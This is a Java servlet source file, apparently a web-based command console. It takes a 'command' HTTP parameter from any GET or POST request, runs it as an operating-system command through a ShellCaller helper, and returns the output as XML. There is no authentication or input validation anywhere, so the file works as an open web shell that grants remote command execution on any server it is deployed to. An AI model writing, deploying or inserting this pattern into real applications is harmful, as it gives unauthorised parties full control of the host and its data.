
/*
 * Created on 19/04/2006
 *   
 */


import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Console extends HttpServlet {
	PrintWriter out = null;
	HttpServletResponse response = null; 
	ShellCaller sc = new ShellCaller();
	
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
   	
    	try {
            out = new PrintWriter(new OutputStreamWriter(response.getOutputStream()));
        }
        catch (IllegalStateException e) {
            out = response.getWriter();
        }

       	//response.setContentType("text/html");
        response.setContentType("text/xml");

        if(request.getParameter("command") != null){
        	String strCommand = request.getParameter("command");
        	String resp = "";        	
        	String [] command = strCommand.split("\\s");
        	
        	resp = sc.exec(command);
        	
        	resp = resp.replaceAll("\n", "<br>");
        	String xml = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>";
        	xml = xml + "<out><![CDATA[\n";
        	xml = xml + resp;     	
        	xml = xml + "]]></out>";
        	
        	out.write(xml);
        }else {
        	String xml = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>";
        	xml = xml + "<out><![CDATA[\n";
        	xml = xml + "Invalid parameter";     	
        	xml = xml + "]]></out>";
        	out.write(xml);
		}
        out.flush();
    }

}